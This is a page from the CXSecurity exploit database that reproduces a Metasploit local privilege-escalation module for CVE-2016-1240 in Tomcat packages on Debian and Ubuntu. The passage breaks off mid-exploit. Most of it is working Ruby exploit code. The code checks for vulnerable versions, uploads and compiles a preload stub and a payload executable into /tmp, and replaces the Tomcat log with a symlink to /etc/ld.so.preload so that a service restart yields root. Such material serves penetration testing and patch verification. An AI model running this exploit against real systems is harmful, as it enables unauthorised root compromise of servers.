---
title: Apache Tomcat On Ubuntu Log Init Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023020010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-07
fetch_date: 2025-10-04T05:48:51.540076
---

# Apache Tomcat On Ubuntu Log Init Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache Tomcat On Ubuntu Log Init Privilege Escalation** **2023.02.06**  Credit:  **[h00die](https://cxsecurity.com/author/h00die/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2016-1240](https://cxsecurity.com/cveshow/CVE-2016-1240/ "Click to see CVE-2016-1240")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")**  CVSS Base Score: **7.2/10**  Impact Subscore: **10/10**  Exploitability Subscore: **3.9/10**  Exploit range: **Local**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Complete**  Integrity impact: **Complete**  Availability impact: **Complete** | |

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in a command on a linux computer for priv esc.
#
###
class MetasploitModule < Msf::Exploit::Local
Rank = ManualRanking
include Msf::Exploit::Retry
include Msf::Post::Linux::Priv
include Msf::Post::Linux::System
include Msf::Post::File
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
include Msf::Post::Linux::Compile
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Apache Tomcat on Ubuntu Log Init Privilege Escalation',
'Description' => %q{
Tomcat (6, 7, 8) packages provided by default repositories on Debian-based
distributions (including Debian, Ubuntu etc.) provide a vulnerable
tomcat init script that allows local attackers who have already gained access
to the tomcat account (for example, by exploiting an RCE vulnerability
in a java web application hosted on Tomcat, uploading a webshell etc.) to
escalate their privileges from tomcat user to root and fully compromise the
target system.
Tested against Tomcat 8.0.32-1ubuntu1.1 on Ubuntu 16.04
},
'License' => MSF\_LICENSE,
'Author' => [
'h00die', # msf module
'Dawid Golunski <dawid@legalhackers.com>' # original PoC, analysis, discovery
],
'Platform' => [ 'linux' ],
'Arch' => [ ARCH\_X86, ARCH\_X64, ARCH\_PYTHON ],
'SessionTypes' => [ 'shell', 'meterpreter' ],
'Targets' => [[ 'Auto', {} ]],
'Privileged' => true,
'DefaultOptions' => {
'PrependFork' => true,
'WfsDelay' => 1800 # 30min
},
'References' => [
[ 'EDB', '40450' ],
[ 'URL', 'https://ubuntu.com/security/notices/USN-3081-1'],
[ 'URL', 'http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html'],
[ 'CVE', '2016-1240']
],
'DisclosureDate' => '2016-09-30',
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [ARTIFACTS\_ON\_DISK, CONFIG\_CHANGES, IOC\_IN\_LOGS]
}
)
)
register\_options [
OptString.new('CATALINA', [ true, 'Location of catalina.out file', '/var/log/tomcat8/catalina.out' ])
]
register\_advanced\_options [
OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
]
end
def base\_dir
datastore['WritableDir'].to\_s
end
def preload
'/etc/ld.so.preload'
end
def catalina
datastore['CATALINA']
end
def check
package = cmd\_exec('dpkg -l tomcat[6-8] | grep \'^i\'')
if package.nil? || package.empty?
return CheckCode::Safe('Unable to execute command to determine installed pacakges')
end
package = package.gsub('\s+', ' ') # replace whitespace with space so we can split easy
package = package.split(' ')
# 0 is ii for installed
# 1 is tomcat# for package name
# 2 is version number
package = Rex::Version.new(package[2])
if (package.to\_s.start\_with?('8') && package < Rex::Version.new('8.0.32-1ubuntu1.2')) ||
(package.to\_s.start\_with?('7') && package < Rex::Version.new('7.0.52-1ubuntu0.7')) ||
(package.to\_s.start\_with?('6') && package < Rex::Version.new('6.0.35-1ubuntu3.8'))
return CheckCode::Appears("Vulnerable app version detected: #{package}")
end
CheckCode::Safe("Unexploitable tomcat packages found: #{package}")
end
def exploit
# Check if we're already root
if is\_root? && !datastore['ForceExploit']
fail\_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
end
unless writable? base\_dir
fail\_with Failure::BadConfig, "#{base\_dir} is not writable"
end
unless file? catalina
fail\_with Failure::BadConfig, "#{catalina} not found or still symlinked"
end
if file? preload
fail\_with Failure::BadConfig, "#{preload} found, check file as it needs to be removed for exploitation"
end
vprint\_status("Creating backup of #{catalina}")
@catalina\_content = read\_file(catalina)
path = store\_loot(
catalina,
'text/plain',
rhost,
@catalina\_content,
'catalina.out'
)
print\_good("Original #{catalina} backed up to #{path}")
if live\_compile?
# upload our privesc stub
so\_stub = ".#{rand\_text\_alphanumeric(5..10)}.so"
so\_stub\_path = "#{base\_dir}/#{so\_stub}"
payload\_path = "#{base\_dir}/.#{rand\_text\_alphanumeric(5..10)}"
# Upload exploit stub
vprint\_status "Compiling exploit stub: #{so\_stub\_path}"
upload\_and\_compile so\_stub\_path, strip\_comments(exploit\_data('CVE-2016-1240', 'privesc\_preload.c').gsub('$BACKDOORPATH', payload\_path)), '-Wall -fPIC -shared -ldl'
else
payload\_path = '/tmp/.jMeY5vToQl'
so\_stub = '.ny9NyKEPJ.so'
so\_stub\_path = "/tmp/#{so\_stub}"
write\_file(so\_stub\_path, exploit\_data('CVE-2016-1240', 'stub.so'))
end
register\_file\_for\_cleanup(so\_stub\_path)
# Upload payload executable
vprint\_status("Uploading Payload to #{payload\_path}")
upload\_and\_chmodx payload\_path, generate\_payload\_exe
register\_file\_for\_cleanup(payload\_path)
# delete the log and symlink ld.so.preload
vprint\_status("Deleting #{catalina}")
rm\_f(catalina)
vprint\_status("Creating symlink from #{preload} to #{catalina}")
cmd\_exec("ln -s #{preload} #{catalina}")
register\_file\_for\_cleanup(catalina)
# we now need tomcat to restart
print\_good("Waiting #{datastore['WfsDelay']} seconds on tomcat to re-open the logs aka a Tomcat service restart")
succeeded = retry\_until\_truthy(timeout: datastore['WfsDelay']) do
file? preload
end
unless succeeded
print\_error("#{preload} not found, exploit aborted")
return
end
register\_file\_for\_cleanup(preload)
# now that we can write to ld.so.preload, use a ...